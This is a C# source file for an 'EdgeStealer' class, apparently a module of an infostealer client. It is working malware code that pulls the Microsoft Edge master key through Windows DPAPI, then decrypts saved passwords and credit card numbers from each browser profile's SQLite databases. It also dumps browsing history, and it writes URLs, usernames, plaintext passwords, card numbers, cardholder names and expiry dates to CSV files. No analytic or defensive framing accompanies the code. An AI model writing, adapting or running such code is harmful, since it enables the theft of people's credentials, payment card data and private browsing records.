using Newtonsoft.Json;
using System.Data.SQLite;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;


namespace Client.Stealers
{
    static class EdgeStealer
    {
        static readonly string EDGE_PATH = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Edge", "User Data");
        static readonly string EDGE_PATH_LOCAL_STATE = Path.Combine(EDGE_PATH, "Local State");

        [DllImport("crypt32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern bool CryptUnprotectData(ref DATA_BLOB pDataIn, ref string szDataDescr, ref DATA_BLOB pOptionalEntropy, IntPtr pvReserved, ref CRYPTPROTECT_PROMPTSTRUCT pPromptStruct, int dwFlags, ref DATA_BLOB pDataOut);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct DATA_BLOB
        {
            public int cbData;
            public IntPtr pbData;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct CRYPTPROTECT_PROMPTSTRUCT
        {
            public int cbSize;
            public int dwPromptFlags;
            public IntPtr hwndApp;
            public string szPrompt;
        }

        public static SQLiteConnection GetDbConnection(string edgePathLoginDb)
        {
            try
            {
                Console.WriteLine(edgePathLoginDb);
                File.Copy(edgePathLoginDb, "TempVault.db", true);
                return new SQLiteConnection("Data Source=TempVault.db;Version=3;");
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
                Console.WriteLine("[ERR] Edge database cannot be found");
                return null;
            }
        }

        public static byte[] GetSecretKey()
        {
            try
            {
                string localState = File.ReadAllText(EDGE_PATH_LOCAL_STATE, Encoding.UTF8);
                var localStateJson = JsonConvert.DeserializeObject<dynamic>(localState);
                string encryptedKeyBase64 = localStateJson.os_crypt.encrypted_key;
                byte[] encryptedKey = Convert.FromBase64String(encryptedKeyBase64);
                byte[] keyWithPrefixRemoved = new byte[encryptedKey.Length - 5];
                Array.Copy(encryptedKey, 5, keyWithPrefixRemoved, 0, encryptedKey.Length - 5);
                byte[] secretKey = DecryptData(keyWithPrefixRemoved);
                return secretKey;
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
                Console.WriteLine("[ERR] Edge secret key cannot be found");
                return null;
            }
        }

        public static byte[] DecryptData(byte[] encryptedData)
        {
            DATA_BLOB dataIn = new DATA_BLOB();
            DATA_BLOB dataOut = new DATA_BLOB();
            DATA_BLOB entropy = new DATA_BLOB();
            CRYPTPROTECT_PROMPTSTRUCT prompt = new CRYPTPROTECT_PROMPTSTRUCT();
            string description = string.Empty;

            try
            {
                dataIn.pbData = Marshal.AllocHGlobal(encryptedData.Length);
                dataIn.cbData = encryptedData.Length;
                Marshal.Copy(encryptedData, 0, dataIn.pbData, encryptedData.Length);

                if (CryptUnprotectData(ref dataIn, ref description, ref entropy, IntPtr.Zero, ref prompt, 0, ref dataOut))
                {
                    byte[] decryptedData = new byte[dataOut.cbData];
                    Marshal.Copy(dataOut.pbData, decryptedData, 0, dataOut.cbData);
                    return decryptedData;
                }
                else
                {
                    throw new Exception("Error decrypting data.");
                }
            }
            finally
            {
                if (dataIn.pbData != IntPtr.Zero) Marshal.FreeHGlobal(dataIn.pbData);
                if (dataOut.pbData != IntPtr.Zero) Marshal.FreeHGlobal(dataOut.pbData);
            }
        }

        public static string DecryptPassword(byte[] ciphertext, byte[] secretKey)
        {
            try
            {
                byte[] initialisationVector = new byte[12];
                Array.Copy(ciphertext, 3, initialisationVector, 0, 12);

                int encryptedPasswordLength = ciphertext.Length - 15 - 16;
                byte[] encryptedPassword = new byte[encryptedPasswordLength];
                Array.Copy(ciphertext, 15, encryptedPassword, 0, encryptedPasswordLength);

                using (AesGcm cipher = new AesGcm(secretKey))
                {
                    byte[] tag = new byte[16];
                    Array.Copy(ciphertext, ciphertext.Length - 16, tag, 0, 16);

                    byte[] decryptedPassword = new byte[encryptedPassword.Length];
                    cipher.Decrypt(initialisationVector, encryptedPassword, tag, decryptedPassword);

                    string decryptedPass = Encoding.UTF8.GetString(decryptedPassword);
                    return decryptedPass;
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
                Console.WriteLine("[ERR] Unable to decrypt, Edge version <80 not supported. Please check.");
                return "";
            }
        }

        public static void getEdgePasswords() 
        {
            try
            {
                using (var decryptPasswordFile = new StreamWriter("edge_passwords.csv", false, Encoding.UTF8))
                {
                    decryptPasswordFile.WriteLine("index,url,username,password");

                    // (1) Get secret key
                    byte[] secretKey = GetSecretKey();

                    // Search user profile or default folder (this is where the encrypted login password is stored)
                    string[] folders = Directory.GetDirectories(EDGE_PATH, "*", SearchOption.TopDirectoryOnly);
                    foreach (var folder in folders)
                    {
                        if (Regex.IsMatch(Path.GetFileName(folder), @"^Profile.*|^Default$"))
                        {
                            // (2) Get ciphertext from sqlite database
                            string edgePathLoginDb = Path.Combine(folder, "Login Data");
                            using (var conn = GetDbConnection(edgePathLoginDb))
                            {
                                if (secretKey != null && conn != null)
                                {
                                    conn.Open();
                                    using (var cmd = new SQLiteCommand("SELECT action_url, username_value, password_value FROM logins", conn))
                                    using (var reader = cmd.ExecuteReader())
                                    {
                                        int index = 0;
                                        while (reader.Read())
                                        {
                                            string url = reader.GetString(0);
                                            string username = reader.GetString(1);
                                            byte[] encryptedPassword = (byte[])reader["password_value"];

                                            if (!string.IsNullOrEmpty(url) && !string.IsNullOrEmpty(username) && encryptedPassword.Length > 0)
                                            {
                                                // (3) Use AES algorithm to decrypt the password
                                                string decryptedPassword = DecryptPassword(encryptedPassword, secretKey);
                                                

                                                // (5) Save into CSV 
                                                decryptPasswordFile.WriteLine($"{index},{url},{username},{decryptedPassword}");
                                                index++;
                                            }
                                        }
                                    }

                                    conn.Close();
                                }
                            }
                            // Delete temp login db
                            File.Delete("TempVault.db");
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[ERR] {e.ToString()}");
            }
        }
        public static void getEdgeCcs()
        {
            try
            {
                using (var decryptPasswordFile = new StreamWriter("edge_ccs.csv", false, Encoding.UTF8))
                {
                    decryptPasswordFile.WriteLine("index,card_number,name_on_card,expiration_month,expiration_year");

                    // (1) Get secret key
                    byte[] secretKey = GetSecretKey();

                    // Search user profile or default folder (this is where the encrypted credit card data is stored)
                    string[] folders = Directory.GetDirectories(EDGE_PATH, "*", SearchOption.TopDirectoryOnly);
                    foreach (var folder in folders)
                    {
                        if (Regex.IsMatch(Path.GetFileName(folder), @"^Profile.*|^Default$"))
                        {
                            // (2) Get ciphertext from sqlite database
                            string edgePathLoginDb = Path.Combine(folder, "Web Data");
                            using (var conn = GetDbConnection(edgePathLoginDb))
                            {
                                if (secretKey != null && conn != null)
                                {
                                    conn.Open();
                                    using (var cmd = new SQLiteCommand("SELECT card_number_encrypted, name_on_card, expiration_month, expiration_year FROM credit_cards", conn))
                                    using (var reader = cmd.ExecuteReader())
                                    {
                                        int index = 0;
                                        while (reader.Read())
                                        {
                                            byte[] encryptedCardNumber = (byte[])reader["card_number_encrypted"];
                                            string nameOnCard = reader.GetString(reader.GetOrdinal("name_on_card"));
                                            int expirationMonth = reader.GetInt32(reader.GetOrdinal("expiration_month"));
                                            int expirationYear = reader.GetInt32(reader.GetOrdinal("expiration_year"));

                                            if (encryptedCardNumber.Length > 0)
                                            {
                                                // (3) Use AES algorithm to decrypt the card number
                                                string decryptedCardNumber = DecryptPassword(encryptedCardNumber, secretKey);
                                                

                                                // (5) Save into CSV 
                                                decryptPasswordFile.WriteLine($"{index},{decryptedCardNumber},{nameOnCard},{expirationMonth},{expirationYear}");
                                                index++;
                                            }
                                        }
                                    }
                                    conn.Close();
                                }
                            }
                            // Delete temp login db
                            File.Delete("TempVault.db");
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[ERR] {e.ToString()}");
            }

        }

        public static void getEdgeHistory()
        {
            try
            {
                using (var historyFile = new StreamWriter("edge_history.csv", false, Encoding.UTF8))
                {
                    historyFile.WriteLine("index,url,title,last_visit_time");

                    // Search user profile or default folder (this is where the browsing history is stored)
                    string[] folders = Directory.GetDirectories(EDGE_PATH, "*", SearchOption.TopDirectoryOnly);
                    foreach (var folder in folders)
                    {
                        if (Regex.IsMatch(Path.GetFileName(folder), @"^Profile.*|^Default$"))
                        {
                            // (2) Get history from sqlite database
                            string edgePathHistoryDb = Path.Combine(folder, "History");
                            using (var conn = GetDbConnection(edgePathHistoryDb))
                            {
                                if (conn != null)
                                {
                                    conn.Open();
                                    using (var cmd = new SQLiteCommand("SELECT url, title, last_visit_time FROM urls", conn))
                                    using (var reader = cmd.ExecuteReader())
                                    {
                                        int index = 0;
                                        while (reader.Read())
                                        {
                                            string url = reader.GetString(0);
                                            string title = reader.IsDBNull(1) ? "" : reader.GetString(1);
                                            long lastVisitTime = reader.GetInt64(2);
                                            DateTime lastVisitDateTime = ConvertFromWebkitTimestamp(lastVisitTime);

                                            if (!string.IsNullOrEmpty(url))
                                            {
                                               

                                                // (5) Save into CSV 
                                                historyFile.WriteLine($"{index},{url},{title},{lastVisitDateTime}");
                                                index++;
                                            }
                                        }
                                    }
                                }
                            }
                            // Delete temp history db
                            File.Delete("TempVault.db");
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[ERR] {e.ToString()}");
            }
        }


            public static DateTime ConvertFromWebkitTimestamp(long timestamp)
        {
            DateTime epoch = new DateTime(1601, 1, 1, 0, 0, 0, DateTimeKind.Utc);
            return epoch.AddTicks(timestamp * 10);
        }
    }
}
